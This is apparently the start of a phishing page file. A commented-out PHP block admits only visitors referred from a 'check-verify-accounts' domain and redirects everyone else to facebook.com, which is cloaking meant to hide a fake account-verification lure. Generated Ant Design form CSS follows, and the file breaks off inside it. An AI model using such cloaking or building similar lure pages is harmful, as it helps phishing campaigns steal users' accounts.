<?php
// $referringDomain = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
// $allowedDomain = 'business.check-verify-accounts.com';

// if ($referringDomain !== $allowedDomain) {
  // header("HTTP/1.1 301 Moved Permanently");
  // header("Location: https://facebook.com/");
  // exit();
// }
?>
<html lang="en">

<head>
  <style data-rc-order="prepend" rc-util-key="@ant-design-icons">
    .anticon {
      display: inline-block;
      color: inherit;
      font-style: normal;
      line-height: 0;
      text-align: center;
      text-transform: none;
      vertical-align: -0.125em;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .anticon>* {
      line-height: 1;
    }

    .anticon svg {
      display: inline-block;
    }

    .anticon::before {
      display: none;
    }

    .anticon .anticon-icon {
      display: block;
    }

    .anticon[tabindex] {
      cursor: pointer;
    }

    .anticon-spin::before,
    .anticon-spin {
      display: inline-block;
      -webkit-animation: loadingCircle 1s infinite linear;
      animation: loadingCircle 1s infinite linear;
    }

    @-webkit-keyframes loadingCircle {
      100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @keyframes loadingCircle {
      100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-1000" data-css-hash="pzatmc" data-token-hash="icxjto" data-cache-path="icxjto|Form-Form|ant-form|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"] [class^="ant-form"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] [class^="ant-form"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"] [class*=" ant-form"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] [class*=" ant-form"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"] [class^="ant-form"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] [class^="ant-form"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"] [class*=" ant-form"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] [class*=" ant-form"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"] [class^="ant-form"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] [class^="ant-form"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-form"] [class*=" ant-form"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-form"] [class*=" ant-form"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form legend {
      display: block;
      width: 100%;
      margin-bottom: 24px;
      padding: 0;
      color: rgba(0, 0, 0, 0.45);
      font-size: 16px;
      line-height: inherit;
      border: 0;
      border-bottom: 1px solid #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form label {
      font-size: 14px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type="search"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type="radio"],
    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type="checkbox"] {
      line-height: normal;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type="file"] {
      display: block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type="range"] {
      display: block;
      width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form select[multiple],
    :where(.css-dev-only-do-not-override-pr0fja).ant-form select[size] {
      height: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type='file']:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type='radio']:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form input[type='checkbox']:focus {
      outline: 0;
      box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form output {
      display: block;
      padding-top: 15px;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-form-text {
      display: inline-block;
      padding-inline-end: 12px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-small .ant-form-item .ant-form-item-label>label {
      height: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-small .ant-form-item .ant-form-item-control-input {
      min-height: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-large .ant-form-item .ant-form-item-label>label {
      height: 40px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-large .ant-form-item .ant-form-item-control-input {
      min-height: 40px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      margin-bottom: 24px;
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-with-help {
      transition: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-hidden,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-hidden.ant-row {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-has-warning .ant-form-item-split {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-has-error .ant-form-item-split {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label {
      flex-grow: 0;
      overflow: hidden;
      white-space: nowrap;
      text-align: end;
      vertical-align: middle;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label-left {
      text-align: start;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label-wrap {
      overflow: unset;
      line-height: 1.5714285714285714 - 0.25em;
      white-space: unset;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label {
      position: relative;
      display: inline-flex;
      align-items: center;
      max-width: 100%;
      height: 32px;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label>.anticon {
      font-size: 14px;
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label.ant-form-item-required:not(.ant-form-item-required-mark-optional)::before {
      display: inline-block;
      margin-inline-end: 4px;
      color: #ff4d4f;
      font-size: 14px;
      font-family: SimSun, sans-serif;
      line-height: 1;
      content: "*";
    }

    .ant-form-hide-required-mark :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label.ant-form-item-required:not(.ant-form-item-required-mark-optional)::before {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label .ant-form-item-optional {
      display: inline-block;
      margin-inline-start: 4px;
      color: rgba(0, 0, 0, 0.45);
    }

    .ant-form-hide-required-mark :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label .ant-form-item-optional {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label .ant-form-item-tooltip {
      color: rgba(0, 0, 0, 0.45);
      cursor: help;
      writing-mode: horizontal-tb;
      margin-inline-start: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label::after {
      content: ":";
      position: relative;
      margin-block: 0;
      margin-inline-start: 2px;
      margin-inline-end: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label.ant-form-item-no-colon::after {
      content: "\a0";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-control {
      --ant-display: flex;
      flex-direction: column;
      flex-grow: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-control:first-child:not([class^="'ant-col-'"]):not([class*="' ant-col-'"]) {
      width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-control-input {
      position: relative;
      display: flex;
      align-items: center;
      min-height: 32px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-control-input-content {
      flex: auto;
      max-width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-explain,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-extra {
      clear: both;
      color: rgba(0, 0, 0, 0.45);
      font-size: 14px;
      line-height: 1.5714285714285714;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-explain-connected {
      width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-extra {
      min-height: 24px;
      transition: color 0.2s cubic-bezier(0.215, 0.61, 0.355, 1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-explain-error {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-explain-warning {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item-with-help .ant-form-item-explain {
      height: auto;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-feedback-icon {
      font-size: 14px;
      text-align: center;
      visibility: visible;
      animation-name: css-dev-only-do-not-override-pr0fja-antZoomIn;
      animation-duration: 0.2s;
      animation-timing-function: cubic-bezier(0.12, 0.4, 0.29, 1.46);
      pointer-events: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-feedback-icon-success {
      color: #52c41a;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-feedback-icon-error {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-feedback-icon-warning {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-feedback-icon-validating {
      color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help {
      transition: opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help-appear,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help-enter {
      opacity: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help-appear-active,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help-enter-active {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help-leave {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help-leave-active {
      opacity: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help .ant-form-show-help-item {
      overflow: hidden;
      transition: height 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), transform 0.3s cubic-bezier(0.645, 0.045, 0.355, 1) !important;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help .ant-form-show-help-item.ant-form-show-help-item-appear,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help .ant-form-show-help-item.ant-form-show-help-item-enter {
      transform: translateY(-5px);
      opacity: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help .ant-form-show-help-item.ant-form-show-help-item-appear-active,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help .ant-form-show-help-item.ant-form-show-help-item-enter-active {
      transform: translateY(0);
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-show-help .ant-form-show-help-item.ant-form-show-help-item-leave-active {
      transform: translateY(-5px);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-horizontal .ant-form-item-label {
      flex-grow: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-horizontal .ant-form-item-control {
      flex: 1 1 0;
      min-width: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-horizontal .ant-form-item-label[class$='-24']+.ant-form-item-control,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-horizontal .ant-form-item-label[class*='-24 ']+.ant-form-item-control {
      min-width: unset;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline {
      display: flex;
      flex-wrap: wrap;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item {
      flex: none;
      margin-inline-end: 16px;
      margin-bottom: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item-row {
      flex-wrap: nowrap;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item>.ant-form-item-label,
    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item>.ant-form-item-control {
      display: inline-block;
      vertical-align: top;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item>.ant-form-item-label {
      flex: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item .ant-form-text {
      display: inline-block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-inline .ant-form-item .ant-form-item-has-feedback {
      display: inline-block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-vertical .ant-form-item-row {
      flex-direction: column;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-vertical .ant-form-item-label>label {
      height: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-vertical .ant-form-item .ant-form-item-control {
      width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-vertical .ant-form-item-label,
    :where(.css-dev-only-do-not-override-pr0fja).ant-col-24.ant-form-item-label,
    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-24.ant-form-item-label {
      padding: 0 0 8px;
      margin: 0;
      white-space: initial;
      text-align: start;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-vertical .ant-form-item-label>label,
    :where(.css-dev-only-do-not-override-pr0fja).ant-col-24.ant-form-item-label>label,
    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-24.ant-form-item-label>label {
      margin: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form-vertical .ant-form-item-label>label::after,
    :where(.css-dev-only-do-not-override-pr0fja).ant-col-24.ant-form-item-label>label::after,
    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xl-24.ant-form-item-label>label::after {
      visibility: hidden;
    }

    @media (max-width: 575px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label {
        padding: 0 0 8px;
        margin: 0;
        white-space: initial;
        text-align: start;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label {
        margin: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form-item .ant-form-item-label>label::after {
        visibility: hidden;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-form-item {
        flex-wrap: wrap;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-form-item .ant-form-item-label:not([class*=" ant-col-xs"]),
      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-form-item .ant-form-item-control:not([class*=" ant-col-xs"]) {
        flex: 0 0 100%;
        max-width: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-xs-24.ant-form-item-label {
        padding: 0 0 8px;
        margin: 0;
        white-space: initial;
        text-align: start;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-xs-24.ant-form-item-label>label {
        margin: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-xs-24.ant-form-item-label>label::after {
        visibility: hidden;
      }
    }

    @media (max-width: 767px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-sm-24.ant-form-item-label {
        padding: 0 0 8px;
        margin: 0;
        white-space: initial;
        text-align: start;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-sm-24.ant-form-item-label>label {
        margin: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-sm-24.ant-form-item-label>label::after {
        visibility: hidden;
      }
    }

    @media (max-width: 991px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-md-24.ant-form-item-label {
        padding: 0 0 8px;
        margin: 0;
        white-space: initial;
        text-align: start;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-md-24.ant-form-item-label>label {
        margin: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-md-24.ant-form-item-label>label::after {
        visibility: hidden;
      }
    }

    @media (max-width: 1199px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-lg-24.ant-form-item-label {
        padding: 0 0 8px;
        margin: 0;
        white-space: initial;
        text-align: start;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-lg-24.ant-form-item-label>label {
        margin: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-col-lg-24.ant-form-item-label>label::after {
        visibility: hidden;
      }
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-motion-collapse-legacy {
      overflow: hidden;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-motion-collapse-legacy-active {
      transition: height 0.2s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.2s cubic-bezier(0.645, 0.045, 0.355, 1) !important;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-form .ant-motion-collapse {
      overflow: hidden;
      transition: height 0.2s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.2s cubic-bezier(0.645, 0.045, 0.355, 1) !important;
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-1000" data-css-hash="_effect-css-dev-only-do-not-override-pr0fja-antZoomIn">
    @keyframes css-dev-only-do-not-override-pr0fja-antZoomIn {
      0% {
        transform: scale(0.2);
        opacity: 0;
      }

      100% {
        transform: scale(1);
        opacity: 1;
      }
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1nt3vei" data-token-hash="icxjto" data-cache-path="icxjto|Shared|ant">
    :where(.css-dev-only-do-not-override-pr0fja) a {
      color: #1677ff;
      text-decoration: none;
      background-color: transparent;
      outline: none;
      cursor: pointer;
      transition: color 0.3s;
      -webkit-text-decoration-skip: objects;
    }

    :where(.css-dev-only-do-not-override-pr0fja) a:hover {
      color: #69b1ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja) a:active {
      color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja) a:active,
    :where(.css-dev-only-do-not-override-pr0fja) a:hover {
      text-decoration: none;
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja) a:focus {
      text-decoration: none;
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja) a[disabled] {
      color: rgba(0, 0, 0, 0.25);
      cursor: not-allowed;
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="h2joem" data-token-hash="icxjto" data-cache-path="icxjto|Input-Input|ant-input|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"] [class^="ant-input"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] [class^="ant-input"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"] [class*=" ant-input"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] [class*=" ant-input"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"] [class^="ant-input"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] [class^="ant-input"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"] [class*=" ant-input"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] [class*=" ant-input"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"] [class^="ant-input"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] [class^="ant-input"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-input"] [class*=" ant-input"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-input"] [class*=" ant-input"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input {
      box-sizing: border-box;
      margin: 0;
      padding: 4px 11px;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      position: relative;
      display: inline-block;
      width: 100%;
      min-width: 0;
      background-color: #ffffff;
      background-image: none;
      border-width: 1px;
      border-style: solid;
      border-color: #d9d9d9;
      border-radius: 6px;
      transition: all 0.2s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input::-moz-placeholder {
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input::placeholder {
      color: rgba(0, 0, 0, 0.25);
      user-select: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input:placeholder-shown {
      text-overflow: ellipsis;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input:hover {
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-focused {
      border-color: #4096ff;
      box-shadow: 0 0 0 2px rgba(5, 145, 255, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input[disabled] {
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
      box-shadow: none;
      cursor: not-allowed;
      opacity: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-disabled:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input[disabled]:hover {
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-borderless,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-borderless:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-borderless:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-borderless-focused,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-borderless-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-borderless[disabled] {
      background-color: transparent;
      border: none;
      box-shadow: none;
    }

    textarea:where(.css-dev-only-do-not-override-pr0fja).ant-input {
      max-width: 100%;
      height: auto;
      min-height: 32px;
      line-height: 1.5714285714285714;
      vertical-align: bottom;
      transition: all 0.3s, height 0s;
      resize: vertical;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-lg {
      padding: 7px 11px;
      font-size: 16px;
      line-height: 1.5;
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-sm {
      padding: 0px 7px;
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-rtl {
      direction: rtl;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-error:not(.ant-input-disabled):not(.ant-input-borderless).ant-input {
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-error:not(.ant-input-disabled):not(.ant-input-borderless).ant-input:hover {
      border-color: #ffa39e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-error:not(.ant-input-disabled):not(.ant-input-borderless).ant-input:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-error:not(.ant-input-disabled):not(.ant-input-borderless).ant-input-focused {
      border-color: #ff4d4f;
      box-shadow: 0 0 0 2px rgba(255, 38, 5, 0.06);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-error:not(.ant-input-disabled):not(.ant-input-borderless).ant-input .ant-input-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-error:not(.ant-input-disabled):not(.ant-input-borderless).ant-input .ant-input-suffix {
      color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-warning:not(.ant-input-disabled):not(.ant-input-borderless).ant-input {
      border-color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-warning:not(.ant-input-disabled):not(.ant-input-borderless).ant-input:hover {
      border-color: #ffd666;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-warning:not(.ant-input-disabled):not(.ant-input-borderless).ant-input:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-warning:not(.ant-input-disabled):not(.ant-input-borderless).ant-input-focused {
      border-color: #faad14;
      box-shadow: 0 0 0 2px rgba(255, 215, 5, 0.1);
      outline: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-warning:not(.ant-input-disabled):not(.ant-input-borderless).ant-input .ant-input-prefix,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-status-warning:not(.ant-input-disabled):not(.ant-input-borderless).ant-input .ant-input-suffix {
      color: #faad14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input[type="color"] {
      height: 32px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input[type="color"].ant-input-lg {
      height: 40px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input[type="color"].ant-input-sm {
      height: 24px;
      padding-top: 3px;
      padding-bottom: 3px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input[type="search"]::-webkit-search-cancel-button,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input[type="search"]::-webkit-search-decoration {
      -webkit-appearance: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea {
      position: relative;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-show-count>.ant-input {
      height: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-show-count .ant-input-data-count {
      position: absolute;
      bottom: -22px;
      inset-inline-end: 0;
      color: rgba(0, 0, 0, 0.45);
      white-space: nowrap;
      pointer-events: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-allow-clear>.ant-input {
      padding-inline-end: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-textarea-has-feedback .ant-input {
      padding-inline-end: 24px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper {
      padding: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper>textarea.ant-input {
      font-size: inherit;
      border: none;
      outline: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-textarea-affix-wrapper.ant-input-affix-wrapper>textarea.ant-input:focus {
      box-shadow: none !important;
    }

